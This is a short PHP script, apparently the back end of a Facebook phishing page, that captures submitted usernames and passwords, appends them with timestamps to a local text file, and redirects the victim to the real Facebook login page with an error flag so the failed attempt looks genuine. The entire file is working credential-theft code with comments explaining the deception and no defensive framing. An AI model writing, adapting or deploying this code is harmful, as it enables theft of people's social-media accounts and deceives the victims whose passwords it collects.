<?php
// Capture credentials and redirect to real Facebook
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$entry = "Username: " . $username . " | Pass: " . $password . " | Time: " . date('Y-m-d H:i:s') . "\n";
file_put_contents("usernames.txt", $entry, FILE_APPEND);

// Redirect to real Facebook login with error to look realistic
header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=100');
exit();
?>